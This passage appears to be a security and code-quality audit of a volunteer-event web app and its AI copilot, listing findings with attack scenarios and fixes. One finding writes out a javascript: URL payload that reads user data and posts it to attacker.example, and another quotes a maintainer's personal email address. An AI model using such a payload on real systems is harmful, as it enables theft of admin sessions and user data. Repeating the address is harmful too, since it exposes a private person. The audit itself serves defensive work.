findings.title: Frontend production dependencies declared with caret ranges rather than exact pins
findings.vulnerable_code:
"react": "^19.2.0",
    "react-router-dom": "^7.11.0",
findings.attack_scenario: Every runtime dependency uses a caret range, so package.json alone permits any minor/patch within the major. Materially safer than the backend equivalent because frontend/package-lock.json DOES exist (lockfileVersion 3, with integrity hashes) and both frontend/Dockerfile:14 and CI use `npm ci`, which installs strictly from the lock and fails on drift -- builds are reproducible today. The residual exposure is that the ranges silently widen on any `npm install`, which is exactly how react-router drifted from the declared ^7.11.0 to the vulnerable 7.14.0 resolution in BASE-CONFIG-50. Resolved versions verified clean at audit time for react@19.2.5, react-dom@19.2.5, react-markdown@10.1.0 and remark-gfm@4.0.1.
findings.remediation: Keep the lockfile authoritative (npm ci everywhere -- already the case) and add Dependabot npm coverage so range widening happens through reviewed PRs with the advisory diff visible. Optionally drop the carets so package.json and the lock agree. Low value given npm ci is already enforced; treat as documentation of the existing control rather than a required change.

findings.title: Copilot feedback admin page re-fetches on every render: an unbounded request loop against two admin endpoints
findings.attack_scenario: VERIFIED line-by-line by the orchestrator against source. No attacker needed -- the page self-inflicts this on every load. (1) An admin or organizer opens /admin/copilot-feedback (route at App.jsx:150-153, open to both roles; nav item at AdminLayout.jsx:84-86). (2) Line 21 evaluates `window.fetch.bind(window)`, which returns a BRAND NEW function object on every render, because `fetcher` is undefined in the routed (non-test) case. (3) The effect's dependency array is `[f]` (line 60), so React compares the previous `f` to the new one, finds them unequal by reference, and re-runs the effect. (4) The effect issues two authenticated GETs and on success calls setWeekly(wj.weeks || []) and setBottom(bj.messages || []) -- BOTH allocate fresh arrays, so state always changes by reference and a re-render is always scheduled. (5) That render produces another new `f`, re-triggering the effect. The loop never converges: two requests to /api/v1/copilot/admin/feedback/weekly and /admin/feedback/bottom-messages per render, continuously, for as long as the tab is open, each running aggregate SQL server-side. Leaving the tab open on a staff laptop is a sustained self-DoS against the copilot feedback aggregates. The `cancelled` flag only suppresses the setState of a superseded pass; it never aborts the in-flight request, as no AbortController is passed.
findings.remediation: Hoist the default fetcher to module scope so its identity is stable across renders -- `const DEFAULT_FETCH = (...args) => window.fetch(...args);` then `const f = fetcher || DEFAULT_FETCH;`. With that, `f` is either the injected test fetcher or a single stable module-level constant, and `[f]` correctly means 'run once'. Additionally pass an AbortController signal to both fetches and return `() => ac.abort()` from the effect, so a genuine unmount cancels in-flight requests rather than merely ignoring their results.
findings.remediation_applied: DEFAULT_FETCH hoisted to module scope so the [f] dependency is stable; AbortController added and aborted on unmount.

findings.title: FormFieldsDrawer resets the admin's in-progress custom-question edits whenever the parent re-renders
findings.attack_scenario: SEVERITY CORRECTED by orchestrator from the subagent's High to Medium, and the mechanism corrected with it. The subagent claimed an infinite render loop ending in 'Maximum update depth exceeded'. That chain does NOT close: setWorkSchema is local state inside FormFieldsDrawer, and a child's own setState does not re-evaluate the parent's JSX, so the `schema` prop keeps the same object reference across the child's self-triggered re-renders and the effect does not re-fire. The real defect is narrower but genuine. ModulesSection.jsx:595 passes `schema={formFieldsFor?.default_form_schema || []}` -- when a module has no saved schema, which is the default state for every new module, the `|| []` branch allocates a NEW array literal on every render OF THE PARENT. The effect at line 202 depends on `schema` by reference, so every parent re-render while the drawer is open -- a sibling query settling, a mutation's isPending flipping, a toast, a refetch on window focus -- re-runs line 200 and overwrites workSchema with a fresh copy of the saved schema. The admin's unsaved field edits silently vanish mid-form. AdminEventPage.jsx:954 passes `schema={formSchemaQ.data?.schema || []}` and has the identical defect on the event-level override surface.

findings.title: Two Exports date presets are not implemented by the picker, silently producing an unbounded full-history export of volunteer names and emails
findings.attack_scenario: VERIFIED by orchestrator against both files. (1) An admin opens /admin/exports (App.jsx:169, admin-only). (2) ExportsSection.jsx:72 declares four preset ids, two of which -- 'last-quarter' and 'last-12-months' -- the picker does not implement: DatePresetPicker.jsx:4-10 defines LABELS only for 24h|7d|30d|quarter|custom, and rangeForPreset (lines 24-37) has branches only for 24h, 7d, 30d and quarter. The buttons still render, labelled with the raw ids via the `{LABELS[p] || p}` fallback. (3) The admin clicks 'last-12-months' to scope a grant report. rangeForPreset falls through every branch to the terminal `return { from: null, to: null };`. (4) onChange fires with from:null/to:null, and the button now renders aria-pressed="true" -- the UI affirmatively tells the admin the range is applied. (5) toParams drops both nulls, so params is `{}`. (6) handleDownload calls the CSV endpoint with NO from_date/to_date at all. The result is a CSV of EVERY volunteer's name and email address across all time, downloaded to disk under the belief that it covers 12 months. The same fall-through applies to the no-show-rate panel. The exposure is the unbounded scope of a personal-data export combined with a UI that actively misreports that scope.
findings.remediation: Two changes, both needed. (1) Implement the ids ExportsSection actually asks for: add 'last-quarter' and 'last-12-months' to LABELS and to rangeForPreset ('last-12-months' -> isoDaysAgo(365); 'last-quarter' -> the quarter row preceding the one covering `now`). (2) Independently, make the export refuse to run when the range failed to resolve, so an unimplemented or mistyped preset can never widen scope silently: in handleDownload, `if (dateState?.preset !== "custom" && !dateState?.from) { toast.error("Pick a date range before downloading — that preset produced no range."); return; }`. Fix (2) is the one that generalises.

findings.title: Citation panel renders a server-supplied document_url straight into href with no scheme allow-list
findings.vulnerable_code:
{data && data.document_url && (
          <footer className="border-t p-3">
            <a
              href={data.document_url}
              target="_blank"
              rel="noopener noreferrer"
            >
findings.attack_scenario: VERIFIED by orchestrator against source. (1) The copilot answers a staff question and emits citation chunk ids; the admin clicks a CitationChip, mounting CitationPanel. (2) The panel fetches GET ${COPILOT_BASE}/citations/${chunkId} and stores the whole JSON body in state. (3) Line 108 binds href={data.document_url} directly. React applies NO URL sanitization to a plain <a href> -- unlike react-markdown, which is exactly why MarkdownMessage.jsx is safe and this is not. There is no startsWith('http') check anywhere in the file. (4) Any chunk whose ingested document_url metadata is `javascript:fetch('/api/v1/users/').then(r=>r.json()).then(d=>fetch('https://attacker.example/x',{method:'POST',body:JSON.stringify(d)}))` produces a link that, when the admin clicks 'Open source', executes in the admin's origin with the admin's session. rel="noopener noreferrer" and target="_blank" do NOT stop a javascript: URL -- the browser evaluates it in the current document. A data:text/html URL is likewise rendered as a document the admin is primed to trust because the panel framed it as 'the source'. (5) The corpus is the injection point: whoever can add or edit a document the RAG pipeline ingests controls document_url, and that is not the same trust boundary as 'an admin typed this'.

findings.title: Staff check-in and roster client has no refresh-on-401, so the day-of roster dies silently when the access token expires
findings.attack_scenario: VERIFIED by orchestrator: `grep -n "401\|refresh" frontend/src/api/roster.js frontend/src/api/checkIn.js` returns NOTHING -- neither file has any 401 branch or refresh call. These are a second and third HTTP client that the staff check-in surfaces use INSTEAD of lib/api.js, whose single-flight refresh at lib/api.js:18/112 is correct and is not the subject here. (1) An organizer opens the live roster on a phone at the venue (App.jsx:122 routes /organizer/events/:eventId/roster). (2) OrganizerRosterPage.jsx:193-199 polls fetchRoster(eventId) every 5 seconds, and every check-in tap goes through checkInSignup/checkInSession -- all funnelling into _authedRequest. (3) _authedRequest reads the token once, attaches it, and on any non-2xx simply throws. (4) When the access token expires mid-event -- the common case for a multi-hour school visit -- the 5s poll starts returning 401, rosterQ flips to error, and every check-in tap runs the optimistic update then rolls it back with 'Check-in failed. Please retry.' Retrying never helps, because nothing ever refreshes the token. (5) The same gap covers resolveEvent/resolveSlot, which ResolveEventModal uses to close out attendance. The organizer's only recovery is to work out unaided that they must reload and sign in again, mid-check-in-line, with a room full of students waiting.
findings.remediation: Route both files through the one client that already knows how to refresh. Export `request` (or `refreshAccessToken`) from lib/api.js and either delegate entirely -- `return request(path, { method, ...(body !== undefined ? { body } : {}) })` -- or mirror the 401 handling explicitly: on `res.status === 401 && !_retried`, await refreshAccessToken() (already single-flight) and retry once with the new token. Apply the identical change to frontend/src/api/checkIn.js:5-29. Delegating is preferable: three hand-rolled fetch wrappers is how this diverged in the first place.

findings.title: API base silently falls back to http://localhost:8000, so a build missing VITE_API_URL ships a bundle pointing every request at the operator's own machine
findings.attack_scenario: VERIFIED by orchestrator against source. Not an attack -- a deploy failure mode with no guard rail in the code the entire app depends on. (1) Vite inlines VITE_API_URL at BUILD time; the file's own comment (lines 3-5) says so and notes the only protection is a shell guard in docker-compose.prod.yml (${VITE_API_URL:?...}). (2) Any build path that does not go through that one compose file -- a CI job, `npm run build` on a laptop, a Vercel/Netlify project where the var was never set, a new Dockerfile -- yields undefined, and line 10 substitutes the literal "http://localhost:8000". (3) There is no runtime assertion and no console warning; the bundle builds and deploys clean. (4) Every authenticated surface derives from this constant: API_BASE feeds lib/api.js, api/roster.js, api/checkIn.js and copilot/api.js (COPILOT_BASE). (5) A staff member opening the deployed admin panel therefore sends every request -- including Authorization: Bearer <token> -- to http://localhost:8000 on THEIR OWN machine. On a clean machine everything fails with an opaque network error; on a developer's machine with a local backend running, the production admin UI silently drives the developer's local database. A page served over https making http://localhost calls is also blocked as mixed content in most browsers, so it presents as 'the admin panel is broken' with no pointer to the cause.

findings.title: Module clone fires the mutation with a null name when the admin cancels the second prompt
findings.attack_scenario: (1) An admin opens a module's edit drawer and clicks Clone. (2) The first window.prompt returns a slug and IS guarded -- `if (!new_slug) return;`. (3) The second window.prompt asks for a name. Pressing Cancel, or the browser suppressing the dialog (Chrome does this when a page fires repeated prompts), makes window.prompt return null. (4) There is NO guard on new_name. The mutation fires regardless with new_name: null, dispatching a POST to /admin/modules/{slug}/clone. The admin, having just pressed Cancel, is told either 'Module cloned' or an opaque server validation error -- neither reflects 'you cancelled'. (5) The slug is also passed through with no client-side validation despite the prompt copy promising 'lowercase, hyphens only', so a mistyped slug becomes a server-side 422 rather than an inline correction.
findings.remediation: Guard both prompts on `=== null` (cancelled) separately from empty-string, slugify and trim the slug client-side to match the promise in the prompt copy, and return early with a toast when either value is empty after cleanup. Only then call cloneM.mutate.

findings.title: Events list shows Duplicate to organizers, contradicting the event page's own gating and re-creating the dead-end it was added to fix
findings.vulnerable_code:
<button
                      onClick={() => setDuplicating(e)}
                    >
                      Duplicate
                    </button>
findings.attack_scenario: Not an authorization hole -- the server does enforce -- but the two admin surfaces disagree and one of them wastes the organizer's time. (1) /admin/events is inside the shell guarded by roles ['admin','organizer'] (App.jsx:128-131), so organizers reach the events table. (2) EventsSection.jsx:1922-1927 renders Duplicate on every row with no role check, unlike Edit and Delete which are wrapped in quarterEnded guards, and unlike the event detail page. (3) AdminEventPage.jsx:452-464 DOES gate the equivalent button -- `{isAdmin ? (<Button ... Duplicate…</Button>) : null}` -- with the comment 'Duplicating an event is admin-only on the server. Rendering it for organizers meant filling in the whole week-picker drawer and only then being told no.' (4) Clicking Duplicate in the list opens DuplicateEventModal, which prefills the entire event form and only submits on 'Create event'. (5) The POST lands on create_event, which calls ensure_event_staff_access -- so the organizer gets rejected after filling in the whole form: exactly the dead-end AdminEventPage documented and removed. The two surfaces should agree.
findings.remediation: Mirror AdminEventPage's gating in EventsSection: read `const { user } = useAuth();` and wrap the Duplicate button in `{isAdmin ? (...) : null}`, alongside the existing quarterEnded guards.

findings.title: Copilot transcript is keyed by array index, so streaming and rating state can be attributed to the wrong message
findings.vulnerable_code:
{messages.map((m, i) => (
            <React.Fragment key={i}>
findings.attack_scenario: VERIFIED by orchestrator at CopilotDrawer.jsx:301-302. (1) Messages are rendered with key={i}, the array index, not the message id. (2) Each rendered assistant bubble carries stateful children: MessageRatingButtons holds its own local state (active, showComment, comment, submitting, error) and is not remounted when only the key's position is reused. (3) Any operation that inserts, removes or reorders an entry other than at the tail -- a placeholder assistant turn being replaced once message_persisted arrives, a tool-call or confirmation entry being spliced out, an errored turn being dropped -- shifts every subsequent index by one. React then reconciles the component instance from old index N onto the NEW message at index N. (4) The visible result: a half-typed thumbs-down comment, or a rendered submitting/error state, jumps onto a different assistant reply than the one the admin was rating, and the rating POST targets whatever messageId prop the reused instance now receives. The feedback corpus that AdminCopilotFeedbackPage reports on can therefore attribute a thumbs-down comment to the wrong message -- which quietly corrupts the very data being used to evaluate the copilot. Every message already has a stable id available (m.id, stamped by the message_persisted SSE event in useCopilotStream.js:161-174).
findings.remediation: Key on identity, not position: `<React.Fragment key={m.id || m.clientId || `idx-${i}`}>`. Where a message is first appended before the server id arrives, stamp it with a stable client id (crypto.randomUUID()) so the key never changes identity mid-turn.

findings.title: A maintainer's personal Gmail address is hardcoded into the in-app Help page and compiled into the public bundle
findings.vulnerable_code: body: "Reach out to Andy (project owner) in the daily sync. For urgent issues outside sync hours, email siddhantandy@gmail.com. ..."
findings.attack_scenario: VERIFIED by orchestrator at HelpSection.jsx:60. (1) /admin/help is inside the shell guarded by roles ['admin','organizer'], so the string renders to every organizer and admin account, not just the maintainer's own team. (2) Line 60 hardcodes a personal Gmail address -- not an institutional @ucsb.edu address, and not the configurable contact address the product ALREADY has: SiteSettingsCard.jsx:69-99 exposes a contact_email site setting that is fetched and persisted server-side. (3) The string is compiled into the JavaScript bundle, so it is retrievable from the deployed asset by anyone who can fetch the bundle, independent of the route guard. (4) Consequences are the ordinary ones for a leaked personal address -- scraping and targeted phishing -- with the added wrinkle that a phishing mail claiming to be from that address is credible precisely because the app told staff to trust it. It also goes stale the moment the maintainer changes, with no way for an admin to correct it from the UI.
findings.remediation: Read the address the product already stores instead of baking in a personal one: query the site settings and render `${supportEmail}` when set, falling back to 'Set a contact address in Admin -> Overview -> Site settings to show it here.' when it is not. Prefer an institutional or role address (e.g. a shared @ucsb.edu alias) over any individual's mailbox.

findings.title: Copilot /confirm executes a parked tool without re-checking allowed_roles OR session ownership — privilege escalation for any organizer holding an admin-parked call_id
findings.vulnerable_code:
p = _load(call_id)
    tool = registry.get_tool(p.tool_name)
    scope = scope_for(role=scope_role, caller_id=caller_id)
    raw = tool.handler(db, scope, p.args)
findings.attack_scenario: VERIFIED by orchestrator against source, including the exploitability question the subagent did not settle. `grep -rn allowed_roles` across backend/app (excluding the tool definitions themselves) returns EXACTLY ONE enforcement site: app/copilot/agent/loop.py:198 `if scope.role not in tool.allowed_roles:`. The confirm path never reaches that line. app/copilot/router.py:823-838 gates only on `_require_flag_on()` and `_require_admin_or_organizer(current_user)` — which admits ANY organizer — then passes the caller's own role straight through as `scope_role`. app/copilot/agent/confirmation.py:167-171 then does _load / get_tool / scope_for / `tool.handler(db, scope, p.args)` with no allowed_roles test anywhere. A SECOND check is missing alongside it: confirm never verifies the parked call belongs to the caller's own session. The router has a `_load_owned_session` helper (router.py:118) used on other endpoints; confirm does not call it, and nothing compares p.session_id to current_user. Consequence: an organizer who holds a call_id parked by an admin can POST /api/v1/copilot/confirm/{call_id} and execute an admin-only handler — DELETE_EVENT_TOOL (tools/events_edit.py:607 allowed_roles=["admin"]), REVOKE_ORIENTATION_CREDIT_TOOL, CREATE_QUARTER_TOOL, MOVE_VOLUNTEER_TO_SHIFT — and the handler runs under the ORGANIZER's scope, i.e. a Scope object is handed to a tool that role was never permitted to call. It is worse than it looks because, as BASE-QUAL-33 records, those admin-only tools apply no internal owner filter of their own (correctly, since admins see everything) — so loop.py:198 was their only gate. SEVERITY SET TO HIGH RATHER THAN THE SUBAGENT'S CRITICAL, on verified evidence: exploitation is not self-serve. loop.py:198 refuses to PARK an admin-only tool for an organizer in the first place, so the organizer must obtain a call_id created inside an admin's session, and the orchestrator found no endpoint that discloses call_ids to organizers (`grep -n call_id router.py` returns only the confirm route itself). RE-SCORE TO CRITICAL immediately if a call_id is ever surfaced to a non-admin — via an audit-log view, a log aggregator, an error payload, or a shared session. The missing check is unambiguous regardless of reachability. The test suite pins the gap: the only negative test is test_router_confirm.py:224-234, which uses a PARTICIPANT (rejected by _require_admin_or_organizer, so it never reaches the tool layer); `grep -rn organizer` across the three confirm test files returns nothing, and 20+ tests call execute_after_confirmation without one role rejection among them.
findings.remediation:
Enforce both checks inside execute_after_confirmation, so they hold no matter which caller reaches it:
    p = _load(call_id)
    tool = registry.get_tool(p.tool_name)
    if scope_role not in tool.allowed_roles:
        raise PermissionError(...)   # router maps to 403; do NOT consume the pending entry
    if p.session_id is not None and not _session_belongs_to(db, p.session_id, caller_id):
        raise ConfirmationNotFound   # 404, not 403 — do not confirm the call_id exists
    scope = scope_for(role=scope_role, caller_id=caller_id)
Put the role check in confirmation.py rather than router.py: the router is one caller of a function that must be safe for all of them. Then add the two regression tests the suite lacks — an organizer confirming an admin-only parked call gets 403 AND the call remains pending; an organizer confirming a call parked in another user's session gets 404.
findings.remediation_applied: allowed_roles re-checked inside execute_after_confirmation (ConfirmationForbidden); session-ownership checked at the router. Both covered by test_confirm_authorization.py.

findings.title: The copilot role-scope boundary is 8 hand-copied WHERE clauses with no test that any tool applies them — the one DB-level test re-implements the filter inside the test body
findings.vulnerable_code:
s = scope_for(role="organizer", caller_id=uuid_a)
    q = db_session.query(Event).filter(Event.id.in_(event_ids))
    if not s.see_all:
        q = q.filter(Event.owner_id == s.module_owner_id)
    rows = q.all()
    assert len(rows) == 2
findings.attack_scenario: The test is named 'scope applies owner filter to event query', but the TEST applies the filter — `if not s.see_all: q = q.filter(...)` is test code, not product code. The only production input is the two-field Scope dataclass already asserted a few lines above. Meanwhile the real enforcement is the same two lines hand-copied across the tool tree: list_modules.py:35-36, find_module_by_name.py:36-37, find_understaffed_modules.py:69-70, signup_stats_for_week.py:47-48, signup_trend.py:47-48 and :61-62, nudge_understaffed_module.py:78-79, send_reminder_email.py:61, participant_history.py:50, get_module_roster.py:51. Orchestrator-verified: a scan of app/copilot/agent/tools/*.py for files that reference Scope but never `scope.see_all` or `scope.module_owner_id` returns base.py, create_event_with_schedule.py, create_module_from_template.py, current_user_context.py, events_edit.py, module_templates.py, move_participant.py, operations.py, orientation_credits.py, quarters.py and staff.py. IMPORTANT NUANCE the subagent overstated: for the admin-only tools in that list, having no owner filter is CORRECT — an admin's scope is see_all, so a filter would be dead code. The defect is not that those tools leak today; it is that nothing anywhere asserts the invariant, so a new organizer-visible tool that forgets the two lines, or a refactor that drops them from an existing one, leaks organizer B's modules and rosters to organizer A and this test still passes — because it never calls a tool. It also means the admin-only tools have no second line of defence of their own, which is what makes BASE-SEC-48 escalate rather than fail safe.
findings.remediation:
Replace the hand-rolled assertion with one parametrized over the registry, so the invariant is enforced for every current AND future organizer-visible tool:
@pytest.mark.parametrize("tool", [t for t in registry.all_tools() if "organizer" in t.allowed_roles])
def test_every_organizer_tool_is_owner_scoped(db_session, seed_events, tool):
    scope = scope_for(role="organizer", caller_id=uuid_a)
    out = tool.handler(db_session, scope, _minimal_args(tool))
    assert "B-evt-1" not in json.dumps(out, default=str)
Structurally better still: move the filter out of the 8 call sites into a single `scope.apply(query, model)` helper so there is one place to test and one place to forget.

findings.title: Two test suites pin two contradictory tenancy models: the REST roster is open to every organizer while the copilot roster tool is owner-scoped
findings.attack_scenario: PRODUCT DECISION REQUIRED — flagged rather than fixed, because both behaviours are deliberate and documented and only the owner can say which is right. The copilot's entire layer-2 boundary exists to stop organizer A seeing organizer B's data: get_module_roster.py:51 `if not scope.see_all and event.owner_id != scope.module_owner_id:` and test_tool_invoke.py:59-73 test_organizer_cannot_see_other_organizers_modules. But deps.ensure_event_staff_access (deps.py:216-241) admits ANY organizer to ANY event, and this test pins that — with a docstring recording that it asserted the opposite until the event-access rule was deliberately widened, because owner-scoping 'made the roster tab fail on every event an admin had set up, with no way to transfer ownership.' The deps.py docstring makes the same argument at length and concludes 'Organizers are a trusted staff role, so the gate is role-based; the boundary that matters is the set of admin-only routes.' So an organizer refused a roster by the copilot obtains the identical roster — including the venue check-in code — from GET /api/v1/events/{id}/roster. The same widening is pinned at test_check_in_endpoints.py:1022 (any organizer may undo any check-in) and test_slot_resolve_credits.py:396 (any organizer may resolve attendance and mint orientation credits on any other organizer's event). Because BOTH models are asserted by green tests, whichever one is wrong cannot be corrected without a red build, and no test anywhere compares the two surfaces.

findings.title: Seven magic-link confirm tests pytest.skip themselves precisely when token issuance breaks
findings.attack_scenario: _TokenCapture wraps the real app.magic_link_service.issue_token, so `cap.last_token is None` means exactly one thing: production created the signup and never minted a magic-link token. That is a total outage of the volunteer confirmation path — every volunteer receives a 201 and no confirmable link — and the suite converts it into seven green skips (lines 402, 425, 577, 603, 634, 669, 1204), plus an eighth at test_phase09_smoke.py:133, which is the only end-to-end create->confirm->manage smoke in the repo. A skipped test does not fail CI, and the coverage gates in ci.yml are line-based, so the entire confirmation surface can go dark with a fully passing build. The skip reason blames the harness ('not patched at module level') for a condition that is equally produced by the product being broken, which is what makes it read as acceptable.
findings.remediation:
Turn the skip into the assertion it should always have been:
        assert token is not None, (
            "signup returned 201 but issue_token was never called — "
            "no volunteer can confirm; this is an outage, not a harness problem"
        )
and add one dedicated guard so the capture harness itself is covered rather than trusted: a test that posts a signup and asserts cap.last_token is not None. If the harness genuinely is fragile, fix the patching — do not let a product outage and a harness misconfiguration share an exit path.

findings.title: deps.py ships three refresh-token helpers with zero callers, zero tests, and none of the offboarding fix applied
findings.attack_scenario: VERIFIED by orchestrator: `grep -rnw create_refresh_token|verify_refresh_token|revoke_refresh_token` across app, alembic, scripts, tests, frontend/src and e2e returns ONLY the three definition lines in deps.py. No callers anywhere, and no tests at all. The live path is auth.py:79-109 _consume_refresh_token, which ends `if not user or not _account_usable(user):` — the offboarding gate added in this audit's pass-4 remediation (BASE-SEC-01). The dead trio never received that fix: verify_refresh_token checks revoked_at and expires_at only, so it will happily mint a session for a deactivated or soft-deleted staff account. Because the names are exported from deps — the module every router already does `from ..deps import ...` against — any future wiring of verify_refresh_token into a route silently reintroduces the exact vulnerability just fixed, and neither the new regression suite nor the coverage gates would notice, because uncalled-and-untested code is invisible to both. This is the shape of defect that makes a fix regress a year later.
findings.remediation: Delete all three functions. They are uncalled, untested, and divergent from the live implementation, so keeping them is pure downside. If they must stay for a planned route, apply _account_usable to verify_refresh_token in the same commit and add the deactivated-user rejection test — an unpatched copy of an auth primitive sitting in the module every router imports is a trap, not a spare part.

findings.title: Session-wide autouse fixture sets task_eager_propagates=False, swallowing every Celery task exception across the whole suite
findings.attack_scenario: autouse + session scope means this applies to every test file in the backend suite. With task_eager_propagates = False, an exception raised inside any task invoked via .delay() from router code is captured into the EagerResult and never re-raised — and no router test inspects that result. A confirmation, reminder or broadcast task that raises on every single invocation in production (signature drift after a kwargs change, a missing template, a None dereference on the volunteer row) leaves every integration test that enqueues it fully green. This is precisely how a total email outage ships: the router returns 201, the test asserts 201, and the mail never goes out. The fixture docstring names the failure mode as though it were a feature — 'any send_email failures are swallowed (sendgrid key is unset)'. The underlying concern is legitimate (no SendGrid key in tests) but the remedy is far too broad: it suppresses ALL task exceptions to avoid one expected class of them.
findings.remediation:
Propagate by default and handle the SendGrid-key case at its source:
    celery.conf.task_eager_propagates = True   # a broken task must fail the test
Stub the mail transport in the fixture (or assert on a captured-sends list) instead of globally disabling exception propagation. Add a guard test asserting `celery.conf.task_eager_propagates is True` so nobody flips it back silently. Expect this change to turn up real failures on first run — that is the point.

findings.title: Four Celery guard tests assert nothing and patch out the very sender they exist to prove is not called
findings.vulnerable_code:
def test_send_email_notification_kind_signup_missing_returns(...):
    """Unknown signup_id with valid kind returns silently."""
    monkeypatch.setattr(celery_mod, "_send_email", lambda *a, **k: None)
    send_email_notification.run(signup_id=str(uuid.uuid4()), kind="cancellation")
findings.attack_scenario: The behaviour under test is 'entity missing -> send nothing'. The test replaces _send_email with a lambda that discards everything and then makes NO assertion, so the only way it can fail is an outright raise. Delete the missing-entity guard from the task and it will build and send a cancellation email off a None signup — to a blank or stale recipient — and this test still passes. Identical shape at lines 392-394 (test_send_email_notification_user_id_none_returns: the body is one bare call), 397-401 (test_send_email_notification_user_not_found: does not even capture the sender, so a mail to an unknown user_id is unobservable) and 557-566 (test_signup_confirmation_email_missing_entity_returns, which passes a real token="t" — a confirmation link mailed for a nonexistent volunteer would go undetected). These four sit inside the file that satisfies the `app/celery_app.py: 1.00` line-coverage gate in ci.yml, so they purchase 100% line coverage while proving nothing about behaviour. That combination — a coverage gate satisfied by assertion-free tests — is worse than no test, because it reports the area as covered.
findings.remediation:
Capture instead of discarding, and assert the negative:
    sends = []
    monkeypatch.setattr(celery_mod, "_send_email", lambda *a, **k: sends.append(a))
    send_email_notification.run(signup_id=str(uuid.uuid4()), kind="cancellation")
    assert sends == [], "a missing signup must not produce an email"
    assert db_session.query(models.SentNotification).count() == 0
Apply to all four. More generally, treat a 100% line-coverage gate on a module whose tests contain no assertions as a red flag in review.

findings.title: A test pins as correct that one env var disables the copilot spend guard, and the companion test has no assertion at all
findings.vulnerable_code:
def test_e2e_bypass(self, db_session, monkeypatch):
        monkeypatch.setattr(settings, "copilot_rate_limit_messages_per_minute", 0)
        monkeypatch.setenv("EXPOSE_TOKENS_FOR_TESTING", "1")
        enforce_message_rate_limit(user, redis=_FakeRedis())
findings.attack_scenario: EXPOSE_TOKENS_FOR_TESTING is read in three security-relevant places: app/deps.py:55-57 (`if _os.environ.get(...) == "1": return` — ALL HTTP rate limiting off, orchestrator-verified), app/main.py:138-140 (mounts the unauthenticated destructive test-helper routers, see BASE-SEC-49), and the signup path where it leaks confirm tokens into responses. This test makes 'the guard is off' the asserted-correct behaviour, so the bypass can never be narrowed without turning the build red. It only fails closed when ENVIRONMENT is literally the string 'production' (config.py:205-214), and test_security_hardening.py:65-68 pins `settings.environment == "development"` as the default — so a staging host, or a copied .env with the flag set, runs with no LLM spend cap and no brute-force limiter. Separately, test_allows_under_limit (lines 70-77) has NO assertion whatsoever: emptying the body of enforce_message_rate_limit leaves it, test_zero_budget_disables_check and test_null_token_rows_do_not_crash all green.
findings.remediation: Assert the bypass is confined rather than asserting it works: set environment to 'staging' with the flag on and require the 429 to still be raised, so only an explicitly-non-production environment can disable the guard. Give test_allows_under_limit a real assertion on the counter (`assert fake.counts[key] == 3`) so an empty limiter body fails it. Consider gating the bypass on `settings.environment == "test"` explicitly rather than on 'not production', so the default-development posture cannot inherit it.

findings.title: No test asserts the unauthenticated destructive /api/v1/test/* routers are absent by default; the one test that exists imports the handler directly, bypassing the mount gate
findings.vulnerable_code:
from app.routers.test_helpers import seed_cleanup
...
    seed_cleanup(emails=volunteer.email, db=db_session)
findings.attack_scenario: app/routers/test_helpers.py:24-28 defines `@router.delete("/seed-cleanup", status_code=204)` / `def seed_cleanup(emails: str, db: Session = Depends(get_db))` with NO auth dependency at all: an anonymous DELETE mass-deletes signups for any comma-separated list of emails, and event_signups_cleanup (line 97) does the same by event id. The sole containment is `if _expose_tokens: app.include_router(test_helpers_router)` at main.py:138-140 — a single `if` between the public internet and unauthenticated bulk deletion. The only test of this code imports the function and calls it in-process, so it never exercises the router, the mount condition, or the missing auth dependency. `grep -rn seed-cleanup|test_helpers backend/tests/` finds no test asserting that `client.delete("/api/v1/test/seed-cleanup?emails=x")` returns 404 in the default configuration. If a future refactor moves include_router out of the `if`, or a deploy sets the flag with ENVIRONMENT set to anything other than the exact string 'production' (see BASE-QUAL-39), an anonymous caller can wipe the signup table and nothing in CI notices.
findings.remediation: Add the two tests that actually cover the boundary: (1) assert every /api/v1/test/* path returns 404 when EXPOSE_TOKENS_FOR_TESTING is unset; (2) assert an anonymous caller gets 401/403 even when the routers ARE mounted. Then add an auth dependency to the handlers themselves so the mount condition stops being the only control — defence in depth is cheap here, and the current design puts a destructive unauthenticated endpoint one refactor away from production.

findings.title: The shared-session db_session fixture makes every cross-connection visibility and commit-ordering bug structurally invisible
findings.vulnerable_code:
connection = engine.connect()
    trans = connection.begin()
    Session = sessionmaker(bind=connection, expire_on_commit=False, join_transaction_mode="create_savepoint")
findings.attack_scenario: Combined with the `client` fixture overriding get_db to yield the SAME session, every router db.commit() only releases a SAVEPOINT, and every read happens on the one connection that already sees the uncommitted rows. A Celery worker, a second request, or the audit-log writer opening its own connection would see nothing. That is exactly the class of bug the suite had to catch by hand-spying on db_session.commit in test_public_signups.py:672 (test_confirmation_email_enqueued_only_after_commit), whose docstring records that enqueue-before-commit made the worker 'see nothing ("missing entity, skipping") and silently drop the email'. That one instance was found by hand; every other enqueue-before-commit in the codebase is unobservable under this fixture. Note also app/copilot/agent/tools/base.py:38 — 'The audit log writes its own commits (durability-over-atomicity)' — meaning the audit trail's independent commit semantics are never exercised: a rollback that erases a tool-call audit row would still show the row to the test, because it is the same transaction. This fixture design is the right default for speed and isolation; the finding is that there is no escape hatch for the cases where it hides the bug.
findings.remediation: Keep the fast shared-session fixture as the default and add a `second_connection` fixture that opens an independent connection — what a Celery worker or a concurrent request actually sees. Use it in the handful of tests where cross-connection visibility IS the behaviour under test: every .delay() enqueued from a router, and the audit-log independent-commit path. One extra fixture converts a whole class of invisible bugs into testable ones.

findings.title: The copilot citation e2e mocks all three backend routes, so retrieval, rerank and the citation authorization check are never exercised end to end
findings.attack_scenario: All three copilot endpoints are route.fulfill'ed: POST /copilot/sessions (line 69), POST /copilot/sessions/{id}/messages carrying the SSE meta citations event (line 82), and GET /copilot/citations/{chunk_id} (line 106). GET /citations/{chunk_id} is the endpoint that hands a caller the raw text of an arbitrary corpus chunk by id (app/copilot/router.py:322); whether it enforces any per-caller check is exactly what an e2e for citations ought to prove, and this spec proves nothing about it — the browser never reaches the server. The spec passes identically if the copilot backend 500s on every request, if RRF and rerank return garbage, or if /citations/{id} serves a chunk the caller has no right to. It is the only e2e touching the copilot at all, so CI's Playwright job gives the entire RAG surface zero live coverage while reporting it as covered. Relatedly, BASE-SEC-46 found the citation panel renders document_url into an href with no scheme allow-list — a live e2e over this endpoint is where that would have surfaced.
findings.remediation: Keep the mocked spec for pure UI-chip behaviour, and add one unmocked pass with no page.route() at all: log in, ask a real question, click the first citation chip, assert the source path renders non-empty. Add the negative alongside it — request a chunk id the caller should not be able to read and assert a 403. The mocked and live specs answer different questions; the repo currently has only the first.

findings.title: The v1.3 cross-feature integration spec sits outside Playwright's testDir, is describe.skip'd, and ends in expect(true).toBe(true)
